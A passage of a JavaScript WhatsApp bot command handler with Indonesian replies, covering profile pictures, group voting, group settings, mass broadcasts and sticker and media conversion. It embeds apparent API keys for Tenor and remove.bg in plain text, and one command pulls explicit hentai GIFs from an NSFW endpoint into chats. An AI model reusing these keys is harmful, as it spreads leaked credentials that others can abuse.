if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var media = await alfa.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `'panjang'`) {
var { img } = await generateProfilePicture(media)
await alfa.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(media)
m.reply(`Sukses`)
} else {
var memeg = await alfa.updateProfilePicture(botNumber, { url: media })
fs.unlinkSync(media)
m.reply(`Sukses`)
}
}
break
		  case 'setpp': {
				if (!isCreator) throw man.kus
				if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
				if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
				if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
				let media = await alfa.downloadAndSaveMediaMessage(quoted)
				await alfa.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
				m.reply(mess.success)
				}
				break
		   case 'setppgroup': case 'setppgrup': case 'setppgc': {
				if (!m.isGroup) throw man.gcwa
				if (!isAdmins) throw man.ami
				if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
				if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
				if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
				let media = await alfa.downloadAndSaveMediaMessage(quoted)
				await alfa.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
				m.reply(mess.success)
				}
				break
			case 'tagall': {
				if (!m.isGroup) throw man.gcwa
				if (!isBotAdmins) throw man.bomin
				if (!isAdmins) throw man.ami
let teks = `══✪〘 *👥 Tag All* 〙✪══
 
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
				for (let mem of participants) {
				teks += `➤ @${mem.id.split('@')[0]}\n`
				}
				alfa.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
				}
				break
				case 'hidetag': {
			if (!m.isGroup) throw man.gcwa
			if (!isAdmins && !isCreator) throw man.ami
			alfa.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
			}
			break
		case 'style': case 'styletext': {
			if (!isPremier && global.db.data.users[m.sender].limit < 1) return m.reply(global.limit)
db.data.users[m.sender].limit -= 1 // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
		let { styletext } = require('./lib/scraper')
		if (!text) throw '*「 TEXT NYA MANA ? 」*'
				let anu = await styletext(text)
				let teks = `Srtle Text From ${text}\n\n`
				for (let i of anu) {
					teks += `➤ *${i.name}* : ${i.result}\n\n`
				}
				m.reply(teks)
		}
		break
			   case 'vote': {
			if (!m.isGroup) throw man.gcwa
			if (m.chat in vote) throw `_Masih ada vote di chat ini!_\n\n*${prefix}hapusvote* - untuk menghapus vote`
			if (!text) throw `Masukkan Alasan Melakukan Vote, Example: *${prefix + command} Owner Ganteng*`
			m.reply(`Vote dimulai!\n\n*${prefix}upvote* - untuk ya\n*${prefix}devote* - untuk tidak\n*${prefix}cekvote* - untuk mengecek vote\n*${prefix}hapusvote* - untuk menghapus vote`)
			vote[m.chat] = [q, [], []]
			await sleep(1000)
			upvote = vote[m.chat][1]
			devote = vote[m.chat][2]
			teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
 
├ Total: ${vote[m.chat][1].length}

 
└────

┌〔 DEVOTE 〕
 
├ Total: ${vote[m.chat][2].length}

 
└────

*${prefix}hapusvote* - untuk menghapus vote`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
]

			let buttonMessageVote = {
				text: teks_vote,
				footer: alfa.user.name,
				buttons: buttonsVote,
				headerType: 1
			}
			alfa.sendMessage(m.chat, buttonMessageVote)
		}
			break
			   case 'upvote': {
			if (!m.isGroup) throw man.gcwa
			if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
			isVote = vote[m.chat][1].concat(vote[m.chat][2])
			wasVote = isVote.includes(m.sender)
			if (wasVote) throw 'Kamu Sudah Vote'
			vote[m.chat][1].push(m.sender)
			menvote = vote[m.chat][1].concat(vote[m.chat][2])
			teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 
└────

┌〔 DEVOTE 〕
 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 
└────

*${prefix}hapusvote* - untuk menghapus vote`
			let buttonsUpvote = [
			  {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
			  {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
			]

			let buttonMessageUpvote = {
				text: teks_vote,
				footer: alfa.user.name,
				buttons: buttonsUpvote,
				headerType: 1,
				mentions: menvote
			 }
			alfa.sendMessage(m.chat, buttonMessageUpvote)
		}
			 break
				case 'devote': {
			if (!m.isGroup) throw man.gcwa
			if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
			isVote = vote[m.chat][1].concat(vote[m.chat][2])
			wasVote = isVote.includes(m.sender)
			if (wasVote) throw 'Kamu Sudah Vote'
			vote[m.chat][2].push(m.sender)
			menvote = vote[m.chat][1].concat(vote[m.chat][2])
			teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 
└────

┌〔 DEVOTE 〕
 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 
└────

*${prefix}hapusvote* - untuk menghapus vote`
			let buttonsDevote = [
			  {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
			  {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
			]

			let buttonMessageDevote = {
				text: teks_vote,
				footer: alfa.user.name,
				buttons: buttonsDevote,
				headerType: 1,
				mentions: menvote
			}
			alfa.sendMessage(m.chat, buttonMessageDevote)
	}
			break
				 
case 'cekvote':
if (!m.isGroup) throw man.gcwa
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 
└────

┌〔 DEVOTE 〕
 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 
└────

*${prefix}hapusvote* - untuk menghapus vote


©${alfa.user.id}
`
alfa.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
			if (!m.isGroup) throw man.gcwa
			if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
			delete vote[m.chat]
			m.reply('Berhasil Menghapus Sesi Vote Di Grup Ini')
		}
			break
			   case 'group': case 'grup': {
				if (!m.isGroup) throw man.gcwa
				if (!isBotAdmins) throw man.bomin
				if (!isAdmins) throw man.ami
				if (args[0] === 'close'){
					await alfa.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
				} else if (args[0] === 'open'){
					await alfa.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
				} else {
				let buttons = [
						{ buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
						{ buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
					]
					await alfa.sendButtonText(m.chat, buttons, `Mode Group`, alfa.user.name, m)

			 }
			}
			break
			case 'editinfo': {
				if (!m.isGroup) throw man.gcwa
				if (!isBotAdmins) throw man.bomin
				if (!isAdmins) throw man.ami
			 if (args[0] === 'open'){
				await alfa.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
			 } else if (args[0] === 'close'){
				await alfa.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
			 } else {
			 let buttons = [
						{ buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
						{ buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
					]
					await alfa.sendButtonText(m.chat, buttons, `Mode Edit Info`, alfa.user.name, m)

			}
			}
			break
			case 'antilink': {
				if (!m.isGroup) throw man.gcwa
				if (!isBotAdmins) throw man.bomin
				if (!isAdmins) throw man.ami
				if (args[0] === "on") {
				if (db.data.chats[m.chat].antilink) return m.reply(`Sudah Aktif Sebelumnya`)
				db.data.chats[m.chat].antilink = true
				m.reply(`Antilink Aktif !`)
				} else if (args[0] === "off") {
				if (!db.data.chats[m.chat].antilink) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
				db.data.chats[m.chat].antilink = false
				m.reply(`Antilink Tidak Aktif !`)
				} else {
				 let buttons = [
						{ buttonId: 'antilink on', buttonText: { displayText: 'On' }, type: 1 },
						{ buttonId: 'antilink off', buttonText: { displayText: 'Off' }, type: 1 }
					]
					await alfa.sendButtonText(m.chat, buttons, `Mode Antilink`, alfa.user.name, m)
				}
			 }
			 break
			 case 'mute': {
				if (!m.isGroup) throw man.gcwa
				if (!isBotAdmins) throw man.bomin
				if (!isAdmins) throw man.ami
				if (args[0] === "on") {
				if (db.data.chats[m.chat].mute) return m.reply(`Sudah Aktif Sebelumnya`)
				db.data.chats[m.chat].mute = true
				m.reply(`${alfa.user.name} telah di mute di group ini !`)
				} else if (args[0] === "off") {
				if (!db.data.chats[m.chat].mute) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
				db.data.chats[m.chat].mute = false
				m.reply(`${alfa.user.name} telah di unmute di group ini !`)
				} else {
				 let buttons = [
						{ buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
						{ buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
					]
					await alfa.sendButtonText(m.chat, buttons, `Mute Bot`, alfa.user.name, m)
				}
			 }
			 break
			case 'linkgroup': case 'linkgc': {
				if (!m.isGroup) throw man.gcwa
				if (!isBotAdmins) throw man.bomin
				let response = await alfa.groupInviteCode(m.chat)
				alfa.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
			}
			break
			case 'ephemeral': {
				if (!m.isGroup) throw man.gcwa
				if (!isBotAdmins) throw man.bomin
				if (!isAdmins) throw man.gcwa
				if (!text) throw 'Masukkan value enable/disable'
				if (args[0] === 'enable') {
					await alfa.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
				} else if (args[0] === 'disable') {
					await alfa.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
				}
			}
			break
			case 'delete': case 'del': {
				if (!m.quoted) throw false
				let { chat, fromMe, id, isBaileys } = m.quoted
				if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
				alfa.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
			}
			break
			case 'bcgc': case 'bcgroup': {
				if (!isCreator) throw man.kus
				if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
				let getGroups = await alfa.groupFetchAllParticipating()
				let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
				let anu = groups.map(v => v.id)
				m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
				for (let i of anu) {
					await sleep(1500)
					let btn = [{
								urlButton: {
									displayText: 'My Owner 🖤',
									url: 'https://wa.me/62895397918020'
								}
							}, {
								urlButton: {
									displayText: 'My Github 🔥',
									url: 'https://www.github.com/ManzTzy1'
								}
							}, {
								quickReplyButton: {
									displayText: 'Thanks To 📌',
									id: 'thx'
								}
							}, {
								quickReplyButton: {
									displayText: 'Rules Bot',
									id: 'sdk'
								}
							}]
							bc = fs.readFileSync('./lib/bc.jpg')
					  let txt = `*_「 Broadcast Bot 」_*\n\n${text}`
					  alfa.send5ButImg(i, txt, global.copy, bc, btn)
					}
				m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
			}
			break
			case 'bc': case 'broadcast': case 'bcall': {
				if (!isCreator) throw man.kus
				if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
				let anu = await store.chats.all().map(v => v.id)
				m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
		for (let yoi of anu) {
			await sleep(1500)
			let btn = [{
								urlButton: {
									displayText: 'My Owner 🖤',
									url: 'https://wa.me/62895397918020'
								}
							}, {
								urlButton: {
									displayText: 'My Github 🔥',
									url: 'https://www.github.com/ManzTzy1'
								}
							}, {
								quickReplyButton: {
									displayText: 'Thanks To 📌',
									id: 'thx'
								}
							}, {
								quickReplyButton: {
									displayText: 'Rules Bot',
									id: 'sdk'
								}
							}]
							bc = fs.readFileSync('./lib/bc.jpg')
					  let txt = `*_「 Broadcast Bot 」_*\n\n${text}`
					  alfa.send5ButImg(yoi, txt, global.copy, bc, btn)
		}
		m.reply('Sukses Broadcast')
			}
			break
			case 'infochat': {
				if (!m.quoted) m.reply('Reply Pesan')
				let msg = await m.getQuotedObj()
				if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
				let teks = ''
				for (let i of msg.userReceipt) {
					let read = i.readTimestamp
					let unread = i.receiptTimestamp
					let waktu = read ? read : unread
					teks += `➤ @${i.userJid.split('@')[0]}\n`
					teks += ` ┗━➤ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ➤ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
				}
				alfa.sendTextWithMentions(m.chat, teks, m)
			}
			break
			case 'q': case 'quoted': {
		if (!m.quoted) return m.reply('Reply Pesannya!!')
		let wokwol = await alfa.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
		await wokwol.quoted.copyNForward(m.chat, true)
			}
		break
case 'user':
fakey(`_*${bot} Di Pake Oleh:*_ _${pendaftar.length} User_`)
break
			case 'listpc': {
				 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
				 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
				 for (let i of anu) {
					 let nama = store.messages[i].array[0].pushName
					 teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
				 }
				 alfa.sendTextWithMentions(m.chat, teks, m)
			 }
			 break
				case 'listgc': {
				 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
				 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
				 for (let i of anu) {
					 let metadata = await alfa.groupMetadata(i)
					 teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
				 }
				 alfa.sendTextWithMentions(m.chat, teks, m)
			 }
			 break
			 case 'listonline': case 'liston': {
					let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
					let online = [...Object.keys(store.presences[id]), botNumber]
					alfa.sendText(m.chat, 'List Online:\n\n' + online.map(v => '➤ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
			 }
			 break
// Created By Manz Executed
case 'cowner': {
if (!m.key.fromMe && !isCreator) return fakey(man.cre)
if (!args[0]) return m.reply(`Pilih add atau del`)
orgnye = m.mentionedJid[0] ? m.mentionedJid[0].split("@")[0] : m.quoted ? m.quoted.sender.split("@")[0] : args[1] ? args[1] : false
const isCwner = owner.includes(orgnye)
if (args[0] === "add") {
if (isCwner) return m.reply('User Sudah Menjadi Owner')
owner.push(orgnye)
m.reply(`Succes Add Owner`)
} else if (args[0] === "del") {
if (!isCwner) return m.reply('User Bukan Owner')
let delcwner = owner.indexOf(orgnye)
owner.splice(delcwner, 1)
m.reply(`Succes Delete Owner`)
} else {
m.reply("Error")
}
}
break
case 'colong': {
if (!quoted) throw 'Tag Sticker Nya'
				if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}* Manz|Tiji`
				 var author = text.split('|')[0] ? text.split('|')[0] : '-'
 var pack = text.split('|')[1] ? text.split('|')[1] : '-'
				fakey(wet)
				let media = await alfa.downloadAndSaveMediaMessage(quoted, "colong")
				let ran = await getRandom('.png')
				
				exec(`ffmpeg -i ${media} ${ran}`, (err) => {
					fs.unlinkSync(media)
					if (err) throw err
					let buffer = fs.readFileSync(ran)
let sendstik = alfa.sendImageAsSticker(m.chat, buffer, m, { packname: `${author}`, author: `${pack}` })
				})
                    
			
			}
			break
case 'stik': {
if (!q) 'Nama nya ?'
var stik = await fetchJson(`https://api.zacros.my.id/downloader/stickerpack?link=https://getstickerpack.com/stickers/${q}`)
let stik1 = stik.result[Math.floor(Math.random() * stik.result.length)]
let stik2 = stik.result[Math.floor(Math.random() * stik.result.length)]
let stik3 = stik.result[Math.floor(Math.random() * stik.result.length)]
let stik4 = stik.result[Math.floor(Math.random() * stik.result.length)]
let stik5 = stik.result[Math.floor(Math.random() * stik.result.length)]

alfa.sendImageAsSticker(m.chat, stik1, ftrol, { packname: `${copy}`, author: `${author}` })
alfa.sendImageAsSticker(m.chat, stik2, ftrol,{ packname: `${copy}`, author: `${author}` })
alfa.sendImageAsSticker(m.chat, stik3, ftrol,{ packname: `${copy}`, author: `${author}` })
alfa.sendImageAsSticker(m.chat, stik4, ftrol,{ packname: `${copy}`, author: `${author}` })
alfa.sendImageAsSticker(m.chat, stik5, ftrol,{ packname: `${copy}`, author: `${author}` })
}
break
			case 'sticker': case 's': case 'stickergif': case 'sgif': {
			if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
			fakey(wet)
					if (/image/.test(mime)) {
				let media = await quoted.download()
				let encmedia = await alfa.sendImageAsSticker(m.chat, media, m, { packname: global.copy, author: global.copy })
				await fs.unlinkSync(encmedia)
			} else if (/video/.test(mime)) {
				if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
				let media = await quoted.download()
				let encmedia = await alfa.sendVideoAsSticker(m.chat, media, m, { packname: global.copy, author: global.copy })
				await fs.unlinkSync(encmedia)
			} else {
				throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
				}
			}
			break
case 'test': {
anu = `*Saya ${bot} On Kk ${pushname} Pencet All Menu Untuk Menampilkan Menu*`
let btn = [{
								urlButton: {
									displayText: 'My Owner 🖤',
									url: 'https://wa.me/62895397918020'
								}
							}, {
								urlButton: {
									displayText: 'My Github 🔥',
									url: 'https://www.github.com/ManzTzy1'
								}
							}, {
								quickReplyButton: {
									displayText: 'Thanks To 📌',
									id: 'thx'
								}
							}, {
								quickReplyButton: {
									displayText: 'Rules Bot',
									id: 'sdk'
								}
							}, {
								quickReplyButton: {
									displayText: 'All Menu 🎀',
									id: 'allmenu'
								}
							}]
							let test = fs.readFileSync(`./lib/test.jpg`)
alfa.send5Loc(m.chat, anu, global.copy, test, btn)
}
break
case 'poke': case 'bully': case 'cuddle': case 'cry': case 'hug': case 'awoo': case 'kiss': case 'lick': case 'pat': case 'smug': case 'bonk': case 'yeet': case 'blush': case 'smile': case 'wave': case 'highfive': case 'handhold': case 'nom': case 'bite': case 'glomp': case 'slap': case 'kill': case 'kick': case 'happy': case 'wink': case 'dance': case 'cringe': {
if (global.db.data.users[m.sender].limit < 1) return m.reply(global.limit)
fakey(wet)
let anu = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
let media = await getBuffer(anu.url)
let encmedia = await 
alfa.sendVideoAsSticker(m.chat, media, m, { packname: global.copy, author: global.copy })
				await fs.unlinkSync(encmedia)
db.data.users[m.sender].limit -= 1
asu = '```Succes Send Sticker```'
let btn = [{
								urlButton: {
									displayText: 'My Owner 🖤',
									url: 'https://wa.me/62895397918020'
								}
							}, {
								quickReplyButton: {
									displayText: 'Next Sticker',
									id: `${command}`
								}
							}]
							alfa.send5ButMsg(m.chat, asu, global.copy, btn)
				
			}
			break
case 'stickerh': {
fakey(wet)
let anu = await fetchJson(`https://manz-md.herokuapp.com/api/nsfw/hentaigif?apikey=ManzTzy`)
let media = await getBuffer(anu.result)
let encmedia = await alfa.sendVideoAsSticker(m.chat, media, m, { packname: global.copy, author: global.copy })
				await fs.unlinkSync(encmedia)
			}
			break
			case 'ebinary': {
			if (!text) throw `Example : ${prefix + command} text`
			let { eBinary } = require('./lib/binary')
			let eb = await eBinary(text)
			m.reply(eb)
		}
		break
			case 'dbinary': {
			if (!text) throw `Example : ${prefix + command} text`
			let { dBinary } = require('./lib/binary')
			let db = await dBinary(text)
			m.reply(db)
		}
		break
			case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
		if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
			let encmedia = await alfa.sendImageAsSticker(m.chat, res.url, m, { packname: global.copy, author: global.punya, categories: res.tags })
			await fs.unlinkSync(encmedia)
		}
		}
		break
		case 'emojimix2': {
		if (!text) throw `Example : ${prefix + command} 😅`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
		for (let res of anu.results) {
			let encmedia = await alfa.sendImageAsSticker(m.chat, res.url, m, { packname: global.copy, author: global.punya, categories: res.tags })
			await fs.unlinkSync(encmedia)
		}
		}
		break
		    case 'ttp': {
		   if (!text) throw `Example : ${prefix + command} text`
		   fakey(wet)
		   await alfa.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'Manz', 'Tzy', m, {asSticker: true})

		 }
		 break
case 'attp': {
if (!text) throw `Example : ${prefix + command} text`
fakey(wet)
		   await alfa.sendMedia(m.chat, `https://api.xteam.xyz/attp?file&text=${text}`, 'Manz', 'Tzy', m, {asSticker: true})

		 }
		 break
		   case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
			let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
			if (!/image/.test(mime)) throw respond
			if (!text) throw respond
			fakey(wet)
			atas = text.split('|')[0] ? text.split('|')[0] : '-'
			bawah = text.split('|')[1] ? text.split('|')[1] : '-'
			let dwnld = await quoted.download()
			let { floNime } = require('./lib/uploader')
			let fatGans = await floNime(dwnld)
			let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans.result.url}`
			let FaTiH = await alfa.sendImageAsSticker(m.chat, smeme, m, { packname: global.copy, author: global.auhor })
			await fs.unlinkSync(FaTiH)
			}
		   break	 
			case 'dim': case 'si': {
			if (!text) throw `Example : ${prefix + command} text`
			hm = await fetchJson(`https://api.lolhuman.xyz/api/simi?apikey=${lolkey}&text=hai`)
			alfa.sendMessage(m.chat, hm.result, { quoted: m })
			}
			break
			case 'toimage': case 'toimg': {
				if (!quoted) throw 'Reply Image'
				if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
				fakey(wet)
				let media = await alfa.downloadAndSaveMediaMessage(quoted)
				let ran = await getRandom('.png')
				exec(`ffmpeg -i ${media} ${ran}`, (err) => {
					fs.unlinkSync(media)
					if (err) throw err
					let buffer = fs.readFileSync(ran)
					alfa.sendMessage(m.chat, { image: buffer }, { quoted: m })
					fs.unlinkSync(ran)
				})
			}
			break
			case 'tomp4': case 'tovideo': {
				if (!quoted) throw 'Reply Image'
				if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
				fakey(wet)
		let { webp2mp4File } = require('./lib/uploader')
				let media = await alfa.downloadAndSaveMediaMessage(quoted)
				let webpToMp4 = await webp2mp4File(media)
				await alfa.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
				await fs.unlinkSync(media)
			}
			break
			case 'toaud': case 'toaudio': {
			if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
			if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
			fakey(wet)
			let media = await quoted.download()
			let { toAudio } = require('./lib/converter')
			let audio = await toAudio(media, 'mp4')
			alfa.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mp4'}, { quoted : m })
			}
			break
			case 'tomp3': {
			if (/document/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
			if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
			if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
			fakey(wet)
			let media = await quoted.download()
			let { toAudio } = require('./lib/converter')
			let audio = await toAudio(media, 'mp4')
			alfa.sendMessage(m.chat, {document: audio, mimetype: 'audio/mp4', fileName: `Convert By ${alfa.user.name}.mp3`}, { quoted : m })
			}
			break
			case 'tovn': case 'toptt': {
			if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
			if (!quoted) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
			fakey(wet)
			let media = await quoted.download()
			let { toPTT } = require('./lib/converter')
			let audio = await toPTT(media, 'mp4')
			alfa.sendMessage(m.chat, {audio: audio, mimetype:'audio/mp4', ptt:true }, {quoted:m})
			}
			break
			case 'togif': {
				if (!quoted) throw 'Reply Image'
				if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
				fakey(wet)
		let { webp2mp4File } = require('./lib/uploader')
				let media = await alfa.downloadAndSaveMediaMessage(quoted)
				let webpToMp4 = await webp2mp4File(media)
				await alfa.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
				await fs.unlinkSync(media)
			}
			break
			case 'tourl': {
				fakey(wet)
		let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
				let media = await alfa.downloadAndSaveMediaMessage(quoted)
				if (/image/.test(mime)) {
					let anu = await TelegraPh(media)
					m.reply(util.format(anu))
				} else if (!/image/.test(mime)) {
					let anu = await UploadFileUgu(media)
					m.reply(util.format(anu))
				}
				await fs.unlinkSync(media)
			}
			break
			case 'imagenobg': case 'removebg': case 'remove-bg': {
		if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
		if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
		if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
		let remobg = require('remove.bg')
		let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
